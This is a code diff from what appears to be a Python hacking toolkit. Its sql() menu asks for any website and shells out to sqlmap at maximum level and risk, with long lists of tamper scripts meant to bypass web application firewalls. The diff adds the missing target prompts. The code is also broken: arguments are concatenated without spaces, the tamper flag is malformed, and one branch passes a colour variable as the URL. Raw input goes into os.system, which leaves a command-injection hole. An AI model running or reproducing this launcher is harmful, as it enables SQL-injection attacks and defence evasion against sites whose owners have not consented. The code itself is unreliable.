@@ -626,9 +626,11 @@ def sql():
 	 			os.system("cd ~/sqlmap;python sqlmap -u" + w + "--level=5 --risk=3 -p 'item1 - - tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor")
 	 			sql()
 	 	elif m == '1':
-	 				os.system("cd ~/sqlmap;python sqlmap -u" + j + "--level=5 --risk=3 -p 'item1' - - tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes")
-	 				sql()
+	 			j = input("Enter Website : ")
+	 			os.system("cd ~/sqlmap;python sqlmap -u" + j + "--level=5 --risk=3 -p 'item1' - - tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes")
+	 			sql()
 	 	elif m == '2':
+	 			j = input("Enter Website : ")
 	 			os.system("cd ~/sqlmap;python sqlmap -u" + j + "--level=5 --risk=3 -p 'item1' - - tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes")
 	 			sql()
 	 elif j == 'back':
@@ -639,7 +641,6 @@ def sql():
 	 	print(r + '[!]' + w + 'Invalid Input')
 	 	print(r + '[!]' + w + 'Try Again')
 	 	sql()
-
 	 	 
 	
 def info():
